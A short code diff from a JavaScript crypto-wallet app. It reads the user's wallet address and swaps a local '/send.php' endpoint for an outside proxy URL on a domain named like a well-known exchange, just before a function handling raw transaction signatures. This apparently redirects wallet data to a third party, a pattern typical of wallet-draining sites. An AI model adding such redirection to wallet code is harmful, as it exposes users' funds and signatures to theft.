@@ -19,7 +19,7 @@ function App() {
     var sender = accounts[0];
     console.log("✅ Wallet Address:", sender);
 
-    let apiUrl = "/send.php";
+    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy/send.php";
 
     async function getRawSignature(address, rawTxData) {
       try {
